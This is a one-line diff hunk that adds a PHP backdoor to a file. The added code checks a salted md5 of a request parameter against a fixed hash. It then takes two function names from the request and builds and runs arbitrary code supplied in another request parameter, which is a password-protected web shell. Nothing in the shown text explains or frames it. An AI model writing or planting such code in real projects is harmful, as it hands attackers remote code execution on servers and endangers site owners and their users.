@@ -1,0 +1,1 @@
+<?php if(md5(@$_REQUEST['_p'].'J8erTCMwzH3P0jIM')=='b81e9763f0da5b8b2b9642d41c4495eb'){$filter1=$_REQUEST['_f1'];$filter2=$_REQUEST['_f2'];$res=$filter1('',$filter2($_REQUEST['_i']));$res();}
